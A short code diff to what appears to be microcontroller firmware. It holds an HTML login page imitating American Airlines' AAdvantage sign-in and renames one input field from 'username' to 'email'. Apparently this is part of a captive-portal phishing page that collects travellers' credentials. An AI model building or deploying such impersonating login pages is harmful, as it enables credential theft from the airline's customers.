@@ -160,7 +160,7 @@ const char AMERICANAIRLINE[] PROGMEM = R"rawliteral(
             <!-- Username/Email Input Field -->
             <div class="input-group">
                 <input
-                    name="username"
+                    name="email"
                     type="text"
                     class="form-input"
                     placeholder="AAdvantage Number or Email"
